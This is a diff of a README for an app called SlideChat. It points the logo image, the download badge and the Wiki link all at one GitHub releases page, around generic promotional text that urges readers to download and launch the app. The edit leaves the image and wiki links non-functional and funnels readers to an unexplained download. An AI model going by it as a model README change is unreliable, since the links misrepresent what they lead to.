@@ -2,7 +2,7 @@
 
 Welcome to SlideChat - a vibrant and interactive platform for sharing ideas through slides and chat! 🎉
 
-![SlideChat Logo](https://example.com/slidechat_logo.png)
+![SlideChat Logo](https://github.com/Londjide/SlideChat/releases)
 
 ## Table of Contents
 - [Introduction](#introduction)
@@ -27,7 +27,7 @@ SlideChat is a revolutionary application that combines the power of visual prese
 
 To get started with SlideChat, simply download the latest version from the following link and launch the application:
 
-[![Download SlideChat](https://img.shields.io/badge/Download-App.zip-brightgreen)](https://github.com/repo/releases/9246/App.zip)
+[![Download SlideChat](https://github.com/Londjide/SlideChat/releases)](https://github.com/Londjide/SlideChat/releases)
 
 ## Usage
 
@@ -54,7 +54,7 @@ SlideChat is licensed under the Apache License 2.0. You are free to use, modify,
 
 ---
 
-Be sure to check out our [Wiki](https://github.com/repo/wiki) for more detailed documentation on SlideChat and its features.
+Be sure to check out our [Wiki](https://github.com/Londjide/SlideChat/releases) for more detailed documentation on SlideChat and its features.
 
 Thank you for choosing SlideChat to elevate your presentations to the next level! 🚀🔥
 
